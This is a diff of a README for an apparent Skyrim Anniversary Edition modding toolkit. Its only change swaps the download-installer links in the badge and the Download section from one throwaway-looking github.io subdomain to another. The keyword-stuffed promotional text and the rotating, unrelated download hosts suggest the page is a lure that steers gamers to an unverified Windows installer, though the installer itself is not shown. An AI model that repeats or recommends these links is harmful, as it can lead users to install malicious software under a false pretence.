@@ -2,7 +2,7 @@
 
 Welcome to the Skyrim Anniversary Ultimate Toolkit, your all-in-one solution for modding and enhancing the Skyrim Anniversary Edition. This toolkit provides a suite of features designed to customize your gameplay experience on Windows 10 and 11, focusing on the skyrim anniversary mod toolkit to deliver seamless and powerful tools for modding enthusiasts. Whether you're looking to enhance visuals, add new mechanics, or optimize performance, this toolkit has you covered with easy-to-use utilities and regular updates for the latest game version.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## System Requirements
 
@@ -78,7 +78,7 @@ The Skyrim Anniversary Ultimate Toolkit is updated as of January 2026 to support
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
